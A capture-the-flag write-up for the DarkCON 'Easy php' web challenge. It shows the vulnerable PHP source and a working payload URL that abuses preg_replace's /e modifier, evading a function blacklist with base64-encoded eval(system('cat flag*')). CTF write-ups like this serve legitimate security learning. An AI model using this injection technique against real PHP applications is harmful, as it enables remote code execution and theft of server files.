Easy php
========
category: web

[challenge-link:](http://easy-php.darkarmy.xyz/)

>In this challenges there was no hint/desc

solution
---------


when we open the challenge link we get a web page with text ``Welcome DarkCON CTF !!``

in the robots.txt it says ``?lmao``
when we put ``challenge-link:http://easy-php.darkarmy.xyz/?lmao`` we will get the php source code of index.php
source code:
```php
<?php
require_once 'config.php';

$text = "Welcome DarkCON CTF !!";

if (isset($_GET['lmao'])) {
    highlight_file(__FILE__);
    exit;
}
else {
    $payload = $_GET['bruh'];
    if (isset($payload)) {
        if (is_payload_danger($payload)) {
            die("Amazing Goob JOb You :) ");
        }
        else {
            echo preg_replace($_GET['nic3'], $payload, $text);
        }
    }
    echo $text;
}
?>
```

Now we have to pass two GET parameter to the url ``bruh`` and ``nic3``
we get code exicution because of the ``preg_replace()`` function

But the `` is_payload_danger()`` function filters our input so some functions like system etc are blacklisted we have to bypass that
so i used base64 encoded the payload and use eval and decode function to get the flag

base64 of ``system('cat flag*') ``

payload:
```url
http://easy-php.darkarmy.xyz/?nic3=/Dark/e&bruh=eval(base64_decode(%27c3lzdGVtKCdjYXQgZmxhZyonKTsK%27))
```
flag:
darkCON{w3lc0me_D4rkC0n_CTF_2O21_ggwp!!!!}



